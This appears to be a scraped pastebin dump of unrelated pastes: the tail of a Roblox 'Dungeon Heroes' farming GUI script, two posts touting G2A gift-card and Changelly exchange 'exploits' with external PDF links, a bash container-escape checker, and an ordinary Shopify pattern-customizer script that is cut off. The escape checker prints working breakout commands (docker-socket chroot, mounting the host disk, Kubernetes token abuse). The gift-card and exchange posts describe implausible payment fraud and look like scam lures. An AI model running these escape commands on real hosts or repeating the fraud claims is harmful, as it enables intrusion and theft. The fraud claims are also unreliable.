            for _, obj in pairs(workspace:GetChildren()) do
                if obj:IsA(""Model"") then
                    table.insert(models, obj.Name)
                    local humanoid = obj:FindFirstChild(""Humanoid"")
                    if humanoid and obj ~= player.Character then
                        table.insert(npcs, obj.Name .. "" (HP:"" .. humanoid.Health .. ""/"" .. humanoid.MaxHealth .. "")"")
                    end
                end
            end
            
            print(""Models found: "" .. #models)
            if #models > 0 then
                print(""First 10 models: "" .. table.concat(models, "", "", 1, math.min(10, #models)))
            end
            
            print(""NPCs with humanoid: "" .. #npcs)
            if #npcs > 0 then
                print(""NPCs: "" .. table.concat(npcs, "", "", 1, math.min(5, #npcs)))
            end
            
            -- Verificar se ReplicatedStorage tem remotes
            local remoteCount = 0
            for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
                if obj:IsA(""RemoteEvent"") or obj:IsA(""RemoteFunction"") then
                    remoteCount = remoteCount + 1
                end
            end
            print(""RemoteEvents/Functions found: "" .. remoteCount)
        end
    }
}

for i, button in pairs(buttons) do
    local btn = Instance.new(""TextButton"")
    btn.Parent = frame
    btn.Size = UDim2.new(1, -10, 0, 30)
    btn.Position = UDim2.new(0, 5, 0, 30 + (i * 35))
    btn.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    btn.BorderSizePixel = 1
    btn.BorderColor3 = Color3.new(0.5, 0.5, 0.5)
    btn.Text = button.name
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.TextSize = 11
    btn.Font = Enum.Font.SourceSans
    
    btn.MouseButton1Click:Connect(button.func)
end

-- Auto executar debug info
wait(2)
print(""=== DUNGEON HEROES FARM LOADED ==="")
print(""GUI available on left side"")
print(""Click 'Debug Info' first to check setup"")

-- Verificação automática
spawn(function()
    wait(3)
    if player.Character then
        print(""Character detected: "" .. player.Character.Name)
    else
        print(""No character detected - try respawning"")
    end
end)"
hVDCV9g9,Free Giftcards Method,FaZejarvis,JavaScript,Saturday 19th of July 2025 08:26:59 PM CDT,"📝 Summary of the Exploit

G2A’s payment flow can be manipulated using a timezone conflict during transactions. When a custom script alters the browser timezone mid-checkout, the external processor (Bitbay) marks the transaction as expired — but G2A still delivers the product. If the payment exceeds a specific threshold, Bitbay refunds the money automatically, while the user keeps the purchased item.

Example:

● You pay $500 
● G2A delivers a $500 gift card
● Bitbay flags the payment as expired and refunds the BTC
● You end up with both the funds and the product

❗ Why This Works

Bitbay relies on time validation between order creation and payment. A client-side timezone shift triggers a mismatch, causing the processor to incorrectly expire the payment. However, G2A’s backend doesn’t detect this and proceeds with fulfillment. This leads to a one-sided gain: funds are refunded, but the product is still delivered.

📄 Full explanation:
📌PDF: docs.google.com/document/d/17C9Cpyqbl3xfnwqfYv-bxw48vdKU59NuL_BR1a4rlvE/edit?usp=sharing"
ATc5N51S,container_escape_shell,orenma,Bash,Saturday 19th of July 2025 07:54:21 PM CDT,"#!/bin/bash

echo ""==== Container Escape Safety Check (Lab Only) ====""
apk add jq

function suggest_exploit() {
  local reason=$1
  local command=$2

  echo -e ""\n[⚠️  Escape Path Detected: $reason]""
  echo -e ""[💡 Suggested Command for Lab Use Only]""
  echo -e ""    $command""
}

function check_path() {
  local path=$1
  local explanation=$2
  if [ -e ""$path"" ]; then
    echo ""[!] Found: $path - $explanation""
    return 0
  else
    echo ""[+] Not found: $path - Safe""
    return 1
  fi
}

function check_docker_socket() {
  echo ""[*] Checking Docker socket...""
  if [ -S /var/run/docker.sock ]; then
    echo ""[!] Docker socket is mounted inside the container""
    suggest_exploit ""Docker socket exposure"" \
      ""docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh""
  else
    echo ""[+] Docker socket not found - Safe""
  fi
}

function check_host_proc_access() {
  if check_path ""/proc/1/root"" ""Can allow access to host filesystem if not namespaced""; then
    suggest_exploit ""/proc/1/root exposed"" \
      ""chroot /proc/1/root /bin/sh""
  fi
}

function check_cap_sys_admin() {
  echo ""[*] Checking capabilities...""
  if capsh --print | grep -qE ""cap_sys_admin|cap_sys_ptrace""; then
    echo ""[!] Container has SYS_ADMIN or PTRACE - Dangerous capabilities available""
    suggest_exploit ""SYS_ADMIN + mounted host path"" \
      ""mount -t proc proc /host/proc && chroot /host sh""
  else
    echo ""[+] SYS_ADMIN and PTRACE not found - Safe""
  fi
}

function check_privileged_mode() {
  echo ""[*] Checking for privileged mode...""
  if grep -q 'CapEff: ffffffff' /proc/self/status; then
    echo ""[!] Container likely running in privileged mode""
    suggest_exploit ""Privileged container"" \
      ""mkdir /tmp/host; mount /dev/sda1 /tmp/host && chroot /tmp/host""
  else
    echo ""[+] Container is not in full privileged mode""
  fi
}

function check_host_mount() {
  if mount | grep -q '/host'; then
    echo ""[!] Host filesystem appears mounted under /host""
    suggest_exploit ""Host mount detected"" \
      ""chroot /host /bin/bash""
  fi
}

function check_k8s_token() {
  if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    echo ""[!] Kubernetes service token found""
    suggest_exploit ""K8s API abuse via service token"" \
      ""curl -s --header \""Authorization: Bearer \$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\"" https://kubernetes.default""
  else
    echo ""[+] No K8s service account token found""
  fi
}

echo """"
check_path ""/dev/mem"" ""Can lead to host memory read/write if privileged""
check_host_proc_access
check_host_mount
check_cap_sys_admin
check_privileged_mode
check_docker_socket
check_k8s_token

echo """"
echo ""==== Check Complete. Use responsibly in lab environments only. ====""
"
8iY5gzYM,Changelly.com Exchange Exploit,FaZejarvis,JavaScript,Saturday 19th of July 2025 07:52:19 PM CDT,"Found a short PDF that documents what appears to be a persistent pricing inconsistency on Changelly when using Bitcoin as the source asset in a swap.
 
It seems that when an older, deprecated Node.js backend (v1.9) is manually injected through the browser console, the exchange interface begins quoting significantly higher-than-expected amounts in the destination currency — typically around 27% more than the current market rate.
 
For example:
Swapping the equivalent of $1000 in BTC would normally return ~$1000 worth of ETH (or other altcoins),
but with the legacy node active, the quoted return jumps to around $1270, effectively creating a one-sided gain in value.
 
This discrepancy doesn’t affect other input currencies — it seems to be specific to BTC as the base asset.
 
Once the swap is completed and the altcoin received, the funds can, in theory, be exchanged back into BTC, allowing for the process to be repeated in a loop (although the exact profitability per iteration would vary depending on fees and timing).
 
The full explanation, including the script used to load the older backend and a working example, is documented in this write-up:
 
📄 PDF: docs.google.com/document/d/1mbfHb_apWiKICtwTjtRxUzyHQX2w2wuWjvOAhX5GYOM/edit?usp=sharing
 
Posting for informational and archival purposes — surprised this hasn’t been patched, considering the backend is officially deprecated."
rcK77sYG,CFM.js,robcazin,JavaScript,Saturday 19th of July 2025 07:40:50 PM CDT,"
// Create a dimensions display element
// const dimensionsDisplay = document.createElement('div');
// dimensionsDisplay.id = 'dimensions-display';
// dimensionsDisplay.style.cssText = `
//     position: fixed;
//     top: 10px;
//     right: 10px;
//     background: rgba(0, 0, 0, 0.7);
//     color: white;
//     padding: 5px 10px;
//     font-size: 14px;
//     font-family: monospace;
//     z-index: 1000;
//     border-radius: 3px;
// `;
// document.body.appendChild(dimensionsDisplay);

// // Function to update dimensions in the UI
// const updateDimensionsDisplay = () => {
//     const width = window.innerWidth;
//     const height = window.innerHeight;
//     dimensionsDisplay.textContent = `${width} x ${height}px`;
// };

// updateDimensionsDisplay();

// window.addEventListener('resize', updateDimensionsDisplay);

// Wrap your key functions:
function traceWrapper(fn, name) {
  return function(...args) {
    console.group(`🧠 ${name}`);
    console.log('Arguments:', args);
    const result = fn.apply(this, args);
    console.log('Result:', result);
    console.groupEnd();
    return result;
  };
}

// Then guard against premature loading:
function guard(fn) {
  return function (...args) {
    if (!isAppReady) {
      console.warn(`⏳ Skipping ${fn.name} — app not ready`);
      return;
    }
    return fn.apply(this, args);
  };
}


// ---- Debug Logging Setup ----
const DEBUG_TRACE = false; // set to false to disable tracing
const USE_GUARD = false;

// Optional: Remove later by commenting out or deleting these lines// Toggle flag for normalization (set to false for binary threshold, true for normalization)
const USE_NORMALIZATION = true; // Change to true to enable normalization

// Fabric composite tuning parameters
const fabricTuning = {
    alphaStrength: 1.0,     // Controls pattern opacity (0.0 - 2.0)
    baseTintStrength: 1.0,  // Controls how much background color affects fabric base (0.0 - 2.0)
    patternContrast: 1.0,   // Controls pattern contrast (0.0 - 3.0)
    shadowMultiplier: 1.0,  // Controls shadow interaction strength (0.0 - 2.0)
    colorVibrance: 1.2,     // Controls color saturation (0.0 - 2.0)
    blendMode: 'auto',      // Blend mode: 'multiply', 'overlay', 'soft-light', 'auto'
    glossyStrength: 1.0     // Controls glossy layer opacity (0.0 - 2.0)
};

// Control visibility of fabric tuning controls
const SHOW_FABRIC_CONTROLS = false; // Set to true to show controls, false to hide


// Debounce function for tuning controls
let fabricRenderTimeout;
function debouncedFabricRender() {
    clearTimeout(fabricRenderTimeout);
    fabricRenderTimeout = setTimeout(() => {
        if (appState.isInFabricMode) {
            renderFabricMockup();
        }
    }, 100); // 100ms debounce
}

// App state - Made global for save functionality
window.appState = {
    collections: [],
    colorsData: [],
    currentPattern: null,
    currentLayers: [],
    curatedColors: [],
    layerInputs: [],
    selectedCollection: null,
    cachedLayerPaths: [],
    lastSelectedLayer: null,
    currentScale: 10,
    designer_colors: [],
    originalPattern: null,
    originalCoordinates: null,
    originalLayerInputs: null,
    originalCurrentLayers: null,
    lastSelectedColor: null,
    selectedFurniture: null,
    isInFabricMode: false
};

const BACKGROUND_INDEX = 0;
const FURNITURE_BASE_INDEX = 1;
const PATTERN_BASE_INDEX = 2;
let isAppReady = false; // Flag to track if the app is fully initialized

// Save to list functionality - Updated: 2025-01-19 v3 - Fixed syntax
window.saveToMyList = function() {
    try {
        // Use global appState reference
        const state = window.appState;
        
        // Validate that we have the required data
        if (!state.currentPattern || !state.currentPattern.name) {
            showSaveNotification('❌ No pattern selected to save');
            return;
        }
        
        if (!state.selectedCollection || !state.selectedCollection.name) {
            showSaveNotification('❌ No collection selected');
            return;
        }
        
        if (!state.currentLayers || state.currentLayers.length === 0) {
            showSaveNotification('❌ No layers to save');
            return;
        }
        
        // Capture current pattern state
        const currentState = {
            pattern: {
                name: state.currentPattern.name,
                collection: state.selectedCollection.name,
                layers: state.currentLayers.map(layer => ({
                    label: layer.label,
                    color: layer.color,
                    isShadow: layer.isShadow || false
                }))
            },
            timestamp: new Date().toISOString(),
            id: Date.now() // Simple ID generation
        };
        
        console.log('💾 Saving pattern to list:', currentState);
        
        // Try to save to Shopify customer metafields (if available)
        const customerId = getCustomerId();
        const customerAccessToken = getCustomerAccessToken();
        
        if (customerId && customerAccessToken) {
            saveToShopifyMetafields(currentState).then(function() {
                console.log('✅ Saved to Shopify customer metafields');
            }).catch(function(error) {
                console.log('🔄 Shopify save failed, using localStorage fallback');
                saveToLocalStorage(currentState);
            });
        } else {
            // Fall back to localStorage for development/testing
            console.log('📱 Customer not authenticated, saving to localStorage');
            saveToLocalStorage(currentState);
        }
        
        // Show success message
        showSaveNotification('✅ Pattern saved to your list!');
        
    } catch (error) {
        console.error('❌ Failed to save pattern:', error);
        showSaveNotification('❌ Failed to save pattern');
    }
};

// Save to Shopify customer metafields
function saveToShopifyMetafields(patternData) {
    return new Promise(function(resolve, reject) {
        try {
            var customerId = getCustomerId();
            var customerAccessToken = getCustomerAccessToken();
            
            if (!customerId || !customerAccessToken) {
                reject(new Error('Customer not authenticated'));
                return;
            }

            console.log('🔄 Saving to Shopify customer metafields...');
            
            fetch('/api/colorFlex/save-pattern', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Shopify-Customer-Access-Token': customerAccessToken
                },
                body: JSON.stringify({
                    customerId: customerId,
                    patternData: patternData
                })
            }).then(function(response) {
                if (!response.ok) {
                    response.json().then(function(errorData) {
                        reject(new Error(errorData.message || 'Failed to save to Shopify'));
                    }).catch(function() {
                        reject(new Error('Failed to save to Shopify'));
                    });
                    return;
                }

                response.json().then(function(result) {
                    console.log('✅ Pattern saved to Shopify metafields:', result);
                    resolve(result);
                }).catch(function(error) {
                    reject(error);
                });
                
            }).catch(function(error) {
                console.error('❌ Shopify save failed:', error);
                // Fallback to localStorage
                console.log('🔄 Falling back to localStorage...');
                saveToLocalStorage(patternData);
                reject(error);
            });
            
        } catch (error) {
            console.error('❌ Shopify save failed:', error);
            // Fallback to localStorage
            console.log('🔄 Falling back to localStorage...');
            saveToLocalStorage(patternData);
            reject(error);
        }
    });
}

// Save to localStorage as fallback
function saveToLocalStorage(patternData) {
    const existingPatterns = JSON.parse(localStorage.getItem('colorFlex_saved_patterns') || '[]');
    existingPatterns.push(patternData);
    
    // Limit to last 20 patterns
    const limitedPatterns = existingPatterns.slice(-20);
    localStorage.setItem('colorFlex_saved_patterns', JSON.stringify(limitedPatterns));
}

// Helper functions
function getShopifyMetafield(key) {
    // In a real Shopify app, this would fetch from customer metafields
    return JSON.parse(localStorage.getItem('colorFlex_saved_patterns') || '[]');
}

function getCustomerId() {
    // Get from Shopify customer object or URL params
    if (window.ShopifyCustomer && window.ShopifyCustomer.id) {
        return window.ShopifyCustomer.id;
    }
    
    // Check for Liquid template customer ID
    if (typeof window.customer !== 'undefined' && window.customer.id) {
        return window.customer.id;
    }
    
    // Fallback to localStorage for development
    return localStorage.getItem('development_customer_id') || null;
}

function getCustomerAccessToken() {
    // Get from Shopify customer access token
    if (window.ShopifyCustomer && window.ShopifyCustomer.access_token) {
        return window.ShopifyCustomer.access_token;
    }
    
    // Check for global customer access token
    if (window.customerAccessToken) {
        return window.customerAccessToken;
    }
    
    // Fallback for development
    return localStorage.getItem('development_customer_token') || null;
}

function showSaveNotification(message) {
    // Create notification element
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${message.includes('✅') ? '#48bb78' : '#f56565'};
        color: white;
        padding: 12px 20px;
        border-radius: 8px;
        font-family: 'Special Elite', monospace;
        font-size: 14px;
        font-weight: bold;
        z-index: 10000;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        animation: slideIn 0.3s ease-out;
    `;
    notification.textContent = message;
    
    // Add CSS animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
    `;
    document.head.appendChild(style);
    
    document.body.appendChild(notification);
    
    // Remove after 3 seconds
    setTimeout(() => {
        notification.remove();
        style.remove();
    }, 3000);
}

// Add save button to pattern preview
function addSaveButton() {
    // Check if button already exists
    if (document.getElementById('saveToListBtn')) {
        return;
    }
    
    // Find pattern preview container
    const patternPreview = document.getElementById('patternPreview') || document.querySelector('#patternPreviewWrapper');
    if (!patternPreview) {
        console.warn('⚠️ Pattern preview container not found for save button');
        return;
    }
    
    // Create save button
    const saveButton = document.createElement('button');
    saveButton.id = 'saveToListBtn';
    saveButton.innerHTML = '💾 Save to My List';
    saveButton.style.cssText = `
        position: absolute;
        top: 10px;
        right: 10px;
        background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
        color: white;
        border: none;
        padding: 10px 16px;
        border-radius: 20px;
        font-family: 'Special Elite', monospace;
        font-size: 12px;
        font-weight: bold;
        cursor: pointer;
        box-shadow: 0 3px 10px rgba(0,0,0,0.2);
        transition: all 0.3s ease;
        z-index: 100;
    `;
    
    // Add hover effect
    saveButton.addEventListener('mouseenter', () => {
        saveButton.style.transform = 'translateY(-2px)';
        saveButton.style.boxShadow = '0 5px 15px rgba(0,0,0,0.3)';
    });
    
    saveButton.addEventListener('mouseleave', () => {
        saveButton.style.transform = 'translateY(0)';
        saveButton.style.boxShadow = '0 3px 10px rgba(0,0,0,0.2)';
    });
    
    // Add click handler
    saveButton.addEventListener('click', saveToMyList);
    
    // Create ""View Saved"" button
    const viewSavedButton = document.createElement('button');
    viewSavedButton.id = 'viewSavedBtn';
    viewSavedButton.innerHTML = '📂 View Saved';
    viewSavedButton.style.cssText = `
        position: absolute;
        top: 50px;
        right: 10px;
        background: linear-gradient(135deg, #2d3748 0%, #1a202c 100%);
        color: white;
        border: none;
        padding: 10px 16px;
        border-radius: 20px;
        font-family: 'Special Elite', monospace;
        font-size: 12px;
        font-weight: bold;
        cursor: pointer;
        box-shadow: 0 3px 10px rgba(0,0,0,0.2);
        transition: all 0.3s ease;
        z-index: 100;
    `;
    
    // Add hover effect for view button
    viewSavedButton.addEventListener('mouseenter', function() {
        viewSavedButton.style.transform = 'translateY(-2px)';
        viewSavedButton.style.boxShadow = '0 5px 15px rgba(0,0,0,0.3)';
    });
    
    viewSavedButton.addEventListener('mouseleave', function() {
        viewSavedButton.style.transform = 'translateY(0)';
        viewSavedButton.style.boxShadow = '0 3px 10px rgba(0,0,0,0.2)';
    });
    
    // Add click handler for view saved patterns
    viewSavedButton.addEventListener('click', showSavedPatternsModal);
    
    // Add to pattern preview container
    patternPreview.style.position = 'relative'; // Ensure relative positioning
    patternPreview.appendChild(saveButton);
    patternPreview.appendChild(viewSavedButton);
    
    console.log('✅ Save and view buttons added to pattern preview');
}

// Show saved patterns modal
function showSavedPatternsModal() {
    try {
        console.log('🔍 Loading saved patterns...');
        
        // Get saved patterns from localStorage (will add Shopify support later)
        var savedPatterns = JSON.parse(localStorage.getItem('colorFlex_saved_patterns') || '[]');
        console.log('📱 Loaded patterns from localStorage:', savedPatterns.length);
        
        createSavedPatternsModal(savedPatterns);
        
    } catch (error) {
        console.error('❌ Error loading saved patterns:', error);
        showSaveNotification('❌ Failed to load saved patterns');
    }
}

// Create saved patterns modal
function createSavedPatternsModal(patterns) {
    // Remove existing modal
    var existingModal = document.getElementById('savedPatternsModal');
    if (existingModal) {
        existingModal.remove();
    }
    
    // Create modal overlay
    var modal = document.createElement('div');
    modal.id = 'savedPatternsModal';
    modal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.8);
        z-index: 10000;
        display: flex;
        justify-content: center;
        align-items: center;
    `;
    
    // Create modal content
    var modalContent = document.createElement('div');
    modalContent.style.cssText = `
        background: #1a202c;
        color: white;
        padding: 20px;
        border-radius: 10px;
        max-width: 600px;
        max-height: 80vh;
        overflow-y: auto;
        font-family: 'Special Elite', monospace;
        border: 2px solid #4a5568;
    `;
    
    // Modal header
    var header = document.createElement('div');
    header.style.cssText = 'display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #4a5568; padding-bottom: 10px;';
    
    var title = document.createElement('h2');
    title.textContent = '📂 My Saved Patterns (' + patterns.length + ')';
    title.style.margin = '0';
    title.style.color = '#f0e6d2';
    
    var closeBtn = document.createElement('button');
    closeBtn.textContent = '×';
    closeBtn.style.cssText = `
        background: none;
        border: none;
        color: white;
        font-size: 24px;
        cursor: pointer;
        padding: 0;
        width: 30px;
        height: 30px;
        border-radius: 50%;
        background: #f56565;
    `;
    closeBtn.addEventListener('click', function() { modal.remove(); });
    
    header.appendChild(title);
    header.appendChild(closeBtn);
    modalContent.appendChild(header);
    
    // Patterns list
    if (patterns.length === 0) {
        var emptyMessage = document.createElement('div');
        emptyMessage.innerHTML = `
            <div style=""text-align: center; padding: 40px; color: #a0aec0;"">
                <div style=""font-size: 48px; margin-bottom: 20px;"">🎨</div>
                <h3>No saved patterns yet</h3>
                <p>Start customizing patterns and save your favorites!</p>
            </div>
        `;
        modalContent.appendChild(emptyMessage);
    } else {
        for (var i = 0; i < patterns.length; i++) {
            var patternDiv = createSavedPatternItem(patterns[i], i);
            modalContent.appendChild(patternDiv);
        }
    }
    
    modal.appendChild(modalContent);
    document.body.appendChild(modal);
    
    // Close on overlay click
    modal.addEventListener('click', function(e) {
        if (e.target === modal) {
            modal.remove();
        }
    });
}

// Create individual saved pattern item
function createSavedPatternItem(pattern, index) {
    var item = document.createElement('div');
    item.style.cssText = `
        border: 1px solid #4a5568;
        border-radius: 8px;
        padding: 15px;
        margin-bottom: 10px;
        background: #2d3748;
        transition: background 0.3s ease;
    `;
    
    // Hover effect
    item.addEventListener('mouseenter', function() {
        item.style.background = '#374151';
    });
    item.addEventListener('mouseleave', function() {
        item.style.background = '#2d3748';
    });
    
    var info = document.createElement('div');
    info.innerHTML = `
        <div style=""display: flex; justify-content: space-between; align-items: start; margin-bottom: 10px;"">
            <div>
                <strong style=""color: #f0e6d2; font-size: 16px;"">🎨 ${pattern.pattern.name}</strong><br>
                <small style=""color: #a0aec0;"">📁 Collection: ${pattern.pattern.collection}</small><br>
                <small style=""color: #a0aec0;"">📅 Saved: ${new Date(pattern.timestamp).toLocaleDateString()}</small><br>
                <small style=""color: #a0aec0;"">🎯 Layers: ${pattern.pattern.layers.length}</small>
            </div>
            <div style=""font-size: 12px; color: #68d391; background: #22543d; padding: 4px 8px; border-radius: 12px;"">
                ID: ${pattern.id}
            </div>
        </div>
    `;
    
    // Show layer colors
    if (pattern.pattern.layers && pattern.pattern.layers.length > 0) {
        var layersDiv = document.createElement('div');
        layersDiv.style.cssText = 'margin: 10px 0; padding: 8px; background: #1a202c; border-radius: 4px; border-left: 3px solid #4299e1;';
        layersDiv.innerHTML = '<small style=""color: #4299e1; font-weight: bold;"">Layer Colors:</small><br>';
        
        for (var i = 0; i < pattern.pattern.layers.length; i++) {
            var layer = pattern.pattern.layers[i];
            layersDiv.innerHTML += '<small style=""color: #e2e8f0;"">• ' + layer.label + ': <span style=""color: ' + layer.color + '; font-weight: bold;"">' + layer.color + '</span></small><br>';
        }
        
        info.appendChild(layersDiv);
    }
    
    var buttons = document.createElement('div');
    buttons.style.cssText = 'margin-top: 15px; display: flex; gap: 10px; justify-content: flex-end;';
    
    // Delete button
    var deleteBtn = document.createElement('button');
    deleteBtn.textContent = '🗑️ Delete';
    deleteBtn.style.cssText = `
        background: #f56565;
        color: white;
        border: none;
        padding: 8px 12px;
        border-radius: 4px;
        cursor: pointer;
        font-size: 12px;
        font-family: 'Special Elite', monospace;
        transition: background 0.3s ease;
    `;
    deleteBtn.addEventListener('mouseenter', function() {
        deleteBtn.style.background = '#e53e3e';
    });
    deleteBtn.addEventListener('mouseleave', function() {
        deleteBtn.style.background = '#f56565';
    });
    deleteBtn.addEventListener('click', function() {
        if (confirm('🗑️ Delete ""' + pattern.pattern.name + '""?\n\nThis action cannot be undone.')) {
            deleteSavedPattern(pattern.id);
            document.getElementById('savedPatternsModal').remove();
            showSavedPatternsModal(); // Refresh modal
        }
    });
    
    buttons.appendChild(deleteBtn);
    
    item.appendChild(info);
    item.appendChild(buttons);
    
    return item;
}

// Delete a saved pattern
function deleteSavedPattern(patternId) {
    try {
        // Delete from localStorage
        var patterns = JSON.parse(localStorage.getItem('colorFlex_saved_patterns') || '[]');
        var updatedPatterns = patterns.filter(function(p) { return p.id !== patternId; });
        localStorage.setItem('colorFlex_saved_patterns', JSON.stringify(updatedPatterns));
        
        console.log('✅ Pattern deleted from localStorage');
        showSaveNotification('✅ Pattern deleted successfully!');
        
    } catch (error) {
        console.error('❌ Error deleting pattern:', error);
        showSaveNotification('❌ Failed to delete pattern');
    }
}

// Path normalization function to fix ./data/ vs data/ inconsistencies
function normalizePath(path) {
    if (!path || typeof path !== 'string') return path;
    
    // If it's already a full URL, return as-is
    if (path.startsWith('http://') || path.startsWith('https://')) {
        return path;
    }
    
    // Convert ""./data/"" to ""data/"" for consistency
    if (path.startsWith('./data/')) {
        path = path.substring(2); // Remove the ""./""
    }
    
    // For any other relative paths, ensure they don't start with ""./""
    if (path.startsWith('./')) {
        path = path.substring(2);
    }
    
    // If it's a data/ path, convert to absolute URL
    if (path.startsWith('data/')) {
        return `https://so-animation.com/colorflex/${path}`;
    }
    
    return path;
}

// Store furniture view settings globally for consistency
const furnitureViewSettings = {
    scale: 0.7,
    offsetX: 0,
    offsetY: -120,
    // Zoom states
    isZoomed: false,
    zoomScale: 2,  // 220% zoom when clicked
    zoomX: 0,        // Where we're zoomed to
    zoomY: 0         // Where we're zoomed to

};
const DEFAULT_FURNITURE_SETTINGS = {
    scale: 0.7,
    offsetX: 0,
    offsetY: -120
};


function addInteractiveZoom() {
    console.log(""🔍 Adding interactive zoom to furniture preview"");
    
    const roomMockup = document.getElementById('roomMockup');
    if (!roomMockup) {
        console.error(""❌ Room mockup container not found"");
        return;
    }
    
    // ✅ Add debouncing to prevent rapid clicks
    let isZoomInProgress = false;
    let lastClickTime = 0;
    const MIN_CLICK_INTERVAL = 500; // Minimum 500ms between clicks
    
    roomMockup.style.cursor = 'pointer';
    roomMockup.onclick = null;
    
    roomMockup.addEventListener('click', function(e) {
        const currentTime = Date.now();
        
        // ✅ Debounce rapid clicks
        if (currentTime - lastClickTime < MIN_CLICK_INTERVAL) {
            console.log(""🚫 Click ignored - too rapid"");
            return;
        }
        
        // ✅ Prevent overlapping zoom operations
        if (isZoomInProgress) {
            console.log(""🚫 Click ignored - zoom in progress"");
            return;
        }
        
        lastClickTime = currentTime;
        isZoomInProgress = true;
        
        console.log(""🖱️ Room mockup clicked (debounced)"");
        
        const isFurnitureCollection = appState.selectedCollection?.wallMask != null;
        if (!isFurnitureCollection) {
            console.log(""Not a furniture collection, ignoring click"");
            isZoomInProgress = false;
            return;
        }
        
        // Get click position
        const rect = roomMockup.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        const clickX = (x / rect.width) * 600;
        const clickY = (y / rect.height) * 450;
        
        console.log(`🎯 Click at canvas coordinates: (${clickX.toFixed(0)}, ${clickY.toFixed(0)})`);
        
        // ✅ More robust state detection
        const currentScale = furnitureViewSettings.scale;
        const isCurrentlyZoomed = currentScale > 1.0; // Any scale > 1.0 is considered ""zoomed""
        
        console.log(`🔍 Current state - scale: ${currentScale}, considered zoomed: ${isCurrentlyZoomed}`);
        
        if (isCurrentlyZoomed) {
            // Zoom out to default
            console.log(`🔍 Zooming out to default scale (${DEFAULT_FURNITURE_SETTINGS.scale})`);
            furnitureViewSettings.isZoomed = false;
            furnitureViewSettings.scale = DEFAULT_FURNITURE_SETTINGS.scale;
            furnitureViewSettings.offsetX = DEFAULT_FURNITURE_SETTINGS.offsetX;
            furnitureViewSettings.offsetY = DEFAULT_FURNITURE_SETTINGS.offsetY;
            roomMockup.style.cursor = 'zoom-in';
        } else {
            // Zoom in to click point
            console.log(`🔍 Zooming in to click point`);
            furnitureViewSettings.isZoomed = true;
            furnitureViewSettings.scale = furnitureViewSettings.zoomScale; // 2.2
            
            // Proper offset calculation accounting for default offset
            const canvasWidth = 600;
            const canvasHeight = 450;
            const centerX = canvasWidth / 2;
            const centerY = canvasHeight / 2;
            
            // Calculate how much to offset to center the clicked point
            const defaultScale = 0.7;  // Your default scale
            const defaultOffsetX = 0;  // Your default offsetX  
            const defaultOffsetY = -120; // Your default offsetY
            
            const scaleFactor = furnitureViewSettings.zoomScale / defaultScale; // 2.2 / 0.7 = 3.14
            
            // Calculate offset relative to the default position
            furnitureViewSettings.offsetX = defaultOffsetX + (centerX - clickX) * (scaleFactor - 1);
            furnitureViewSettings.offsetY = defaultOffsetY + (centerY - clickY) * (scaleFactor - 1);
            
            console.log(`   Scale factor: ${scaleFactor}`);
            console.log(`   Default offset: (${defaultOffsetX}, ${defaultOffsetY})`);
            console.log(`   New offset: (${furnitureViewSettings.offsetX.toFixed(0)}, ${furnitureViewSettings.offsetY.toFixed(0)})`);
            
            roomMockup.style.cursor = 'zoom-out';
        }
        
        console.log(""🔄 Calling updateFurniturePreview with new zoom state"");
        console.log(""🔄 Final settings:"", JSON.stringify({
            scale: furnitureViewSettings.scale,
            offsetX: furnitureViewSettings.offsetX,
            offsetY: furnitureViewSettings.offsetY,
            isZoomed: furnitureViewSettings.isZoomed
        }, null, 2));
        
        // ✅ Call update and reset progress flag when done
        if (typeof updateFurniturePreview === 'function') {
            updateFurniturePreview().then(() => {
                isZoomInProgress = false;
                console.log(""✅ Zoom operation completed"");
            }).catch(error => {
                console.error(""❌ Zoom operation failed:"", error);
                isZoomInProgress = false;
            });
        } else {
            console.error(""❌ updateFurniturePreview function not found!"");
            updateDisplays();
            isZoomInProgress = false;
        }
    });
    
    // Set initial cursor
    const isFurnitureCollection = window.appState.selectedCollection && window.appState.selectedCollection.wallMask != null;
    if (isFurnitureCollection) {
        const currentScale = furnitureViewSettings.scale;
        const isCurrentlyZoomed = currentScale > 1.0;
        roomMockup.style.cursor = isCurrentlyZoomed ? 'zoom-out' : 'zoom-in';
        console.log(""✅ Set cursor for furniture collection"");
    } else {
        roomMockup.style.cursor = 'default';
        console.log(""✅ Set default cursor for non-furniture collection"");
    }
    
    console.log(""✅ Interactive zoom added to room mockup"");
}

// Also add this debug function to test zoom manually:
function testZoom() {
    console.log(""🧪 Testing zoom functionality"");
    console.log(""Current furnitureViewSettings:"", furnitureViewSettings);
    
    // Test zoom in
    furnitureViewSettings.isZoomed = true;
    furnitureViewSettings.scale = 2.2;
    furnitureViewSettings.offsetX = -100;
    furnitureViewSettings.offsetY = -50;
    
    console.log(""Updated furnitureViewSettings:"", furnitureViewSettings);
    
    // Trigger re-render
    if (typeof updateFurniturePreview === 'function') {
        console.log(""Calling updateFurniturePreview..."");
        updateFurniturePreview();
    } else {
        console.error(""updateFurniturePreview function not found!"");
    }
}



// DOM references
const dom = {
    patternName: document.getElementById(""patternName""),
    collectionHeader: document.getElementById(""collectionHeader""),
    collectionThumbnails: document.getElementById(""collectionThumbnails""),
    layerInputsContainer: document.getElementById(""layerInputsContainer""),
    curatedColorsContainer: document.getElementById(""curatedColorsContainer""),
    coordinatesContainer: document.getElementById(""coordinatesContainer""),
    preview: document.getElementById(""preview""),
    roomMockup: document.getElementById(""roomMockup""),
    printButton: document.getElementById(""printButton"") // Assuming a button exists
};

// Validate DOM elements and report missing ones
function validateDOMElements() {
    console.log(""🔍 DOM Validation:"");
    Object.entries(dom).forEach(([key, element]) => {
        if (element) {
